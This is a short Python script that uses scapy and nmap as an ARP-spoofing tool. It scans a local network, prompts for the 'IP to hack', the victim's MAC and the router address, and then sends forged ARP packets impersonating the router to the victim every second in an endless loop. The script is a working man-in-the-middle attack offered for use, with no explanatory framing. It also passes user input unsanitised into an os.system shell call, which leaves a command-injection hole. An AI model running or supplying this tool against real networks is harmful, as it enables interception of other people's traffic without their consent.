#!/usr/bin/env python3.7
#Francisco J. Jimenez

from scapy.all import *
import time
import os
import sys

os.system('ifconfig')
variable=input("What is your network e.g 192.168.0.*: ")
os.system('nmap \%s' % variable)

operation_code=1
TRUE=1

IPvictim=input("IP to hack: ")
MACvictim=input("MAC to hack: ")
IProuter=input("IP router: ")

ARPmodified=ARP(op=operation_code, psrc=IProuter, pdst=IPvictim, hwdst= MACvictim)

START=input("y/yes to continue or n/no to quit: ")
START=START.lower()

if START == 'y' or START =='yes':
   while TRUE:
         send(ARPmodified)
         time.sleep(1)
else:
   sys.exit()
